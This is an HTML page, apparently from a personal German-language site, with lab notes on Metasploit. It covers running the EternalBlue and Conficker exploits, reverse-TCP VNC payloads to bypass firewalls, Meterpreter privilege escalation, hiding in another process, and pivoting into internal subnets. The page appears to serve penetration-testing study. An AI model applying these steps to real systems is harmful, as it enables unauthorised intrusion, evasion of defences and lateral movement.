@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+        <meta charset="utf-8">
+        <title>Metasploit</title>
+        <link rel="stylesheet" href="thomas.css" type="text/css" media="screen">
+	<link rel="icon" href="pics/thomas.jpg">
+</head>
+
+<body>
+   <div id="thepage">
+
+    <header>
+      <img src="pics/thomas.jpg" width="100">
+      <div class='firma'>THOMAS</div>
+      <p>Metasploit</p>
+    </header>
+
+
+    <nav>
+    <ul>
+        <li><a href="http://thomas.dimes.cc">Zurück</a></li>
+        <li><a href="mich.html">Persönliches</a></li>
+        <li><a href="hobbies.html">Hobbies</a></li>
+        <li><a href="salt.html">SALT</a></li>
+        <li><a href="pi.html">Pi</a></li>
+        <li><a href="rancher.html">Rancher ANL</a></li>
+        <li><a href="meta.html">Metasploit</a></li>
+        <li><a href="snmp.html">SNMP</a></li>
+        <li><a href="scripts/browser.php">Browser</a></li>
+        <li><a href="scripts/login.php">Login</a></li>
+    </nav>
+
+    <section id="content">
+        <h2>Metasploit</h2>
+        <p>Metasploit (MSF6 für z.B. MySQL Scanner) Module sind auxiliary/scanner module. Kali msf6 tool "search name:mysql type:exploit"</p>
+	<p>In Metasploint findet die teilweise alten Module. Mit Tab completion wie: info auxiliary/scanner/ftp.</p>
+	<p> Also suche mit Nessus oder nmap nach Ziel und Dienst und verwendete Version, dann in Metasploint einen scanner oder exploit suchen.</p> 
+        <p>"info auxiliary/scanner/mysql/mysql_login". Hier ist auch der Rank wichtig siehe: search name:mysql type:exploit. Beispiel auch für den </p>
+	<p>SMB Eternalblue exploit: "search name:eternalblue" -> info: "info 0" -> exploit/windows/smb/ms17_010_eternalblue -> dann ausführen mit "use 0" -> show options.</p>
+	<p>Da sieht man dann die Ports und Hosts die man angeben kann/muss (siehe required).</p> 
+	<p>Die Payload Options kann man aussuchen. Welche Payloads kann man nun anwenden? -> show payloads (als Inspiration wie grafische Oberfläche anzeigen mit VNC.</p>
+	<p>-> "set PAYLOAD  windows/x64/vnc" tab Taste dann vncinject/reverse_tcp z.B. wählen. Mit dem reverse TCP kann man Firewall umgehen da nach außen von</p>
+	<p>Firewalls kein Problem darstellen. -> show options -> mit set RHOSTS das Ziel definieren. LHOST und LPORT aber noch ggf überprüfen und </p>
+	<p>setzen (ip addr geht direkt im Metasploit). Damit hat man alles zusammengebaut und man muss nichts mehr im Code beschreiben. Metasploit macht das</p>
+	<p> -> "run" oder "exploit".</p> 
+	<p>Beispiel Exploit conficker: "search cve-2008-4250" -> use 0 - nun wollen wir den Metapreter ausnutzen. Hier wird eine Payload in den Speicher geladen.</p>
+	<p>Dies wird aber schon relativ gut erkannt durch Virenscanner, aber im Lab ein gutes Beispiel. Damit kann man sich auf ein Windows System remote verbinden</p>
+	<p>und bekommt eine shell. Mit "getsystem" wird man zu root wenn man es eh nicht schon ist… Dann Befehle sysinfo, ps -aux, … Hier kann man sich dann</p>
+	<p>auch mit "migrate" (host Exploitation Modul vn Meterpreter) um seine Arbeit in einem anderen Prozess zu verstecken.</p>
+	<p>Also mit "run post/windows/manage/migrate" dann den Prozess umsiedeln. Somit läuft man dann z.B. als Notepad aber mit vollen Rechten.</p>
+	<p>Dann mit "run post/windows/gather/arp_scanner RHOSTS=192.168.10.0/24" für lokales Netz zu scannen. Dann Verbindung mit dem Befehl "background" offen lassen</p>
+	<p>und zu Meta zurück wechseln. Mit "sessions" sieht man die Sessions auch. Nun bauen wir eine Route über das Ziel in das nächste Netzwerk</p>
+	<p> -> "use /post/multi/manage/autoroute". Dann "use auxiliary/scanner/portscan/tcp" - set PORTS 135,137, 445, 1234 - set RHOSTS 192.168.168.10.0/24</p>
+	<p>Set THREADS 20 -> exploit/run. Das Ziel wird nicht direkt erreicht da in einem anderen Subnet der Netzwerkkarte, es waren ja beide installiert,</p>
+	<p> könnte man weiterspringen mit dem Meterpreter (von System zu System handeln)… Oder halt Schadcode ausführen oder User Accounts suchen und diese dann</p>
+	<p> weiter nutzen. Z.B.</p>
+	<p>Ablauf also in der Praxis in eine WLAN oder LAN, dann Nessus oder nmap scan, dann Metasploit für Meterpreter oder VNC exploits je nach identifizierten Schwachstellen.</p>
+    </section>
+
+
+<aside>
+        <h2>Bereiche</h2>
+        <li><a href="http://www.dimes.cc" class="class1">Home</a></li>
+        <li><a href="http://sara.dimes.cc" class="class1">Sara</a></li>
+        <li><a href="http://mona.dimes.cc" class="class1">Mona</a></li>
+        <li><a href="http://jana.dimes.cc" class="class1">Jana</a></li>
+        <h2>Haus</h2>
+        <li><a href="http://rancher.dimes.cc">Rancher</a></li>
+        <li><a href="http://uptime.dimes.cc">Uptime</a></li>
+        <li><a href="http://solr.dimes.cc">Solr</a></li>
+        <h2>Links</h2>
+        <li><a href="https://portal.noe.gv.at" class="class1">Portal</a></li>
+        <li><a href="https://portal-test.noe.gv.at" class="class1">Test Portal</a></li>
+        <li><a href="https://www.networkchuck.com" class="class1">Chuck</a></li>
+</aside>
+
+<footer>
+        <p>2023 | &copy; Thomas</p>
+</footer>
+</div>
+</body>
+</html>
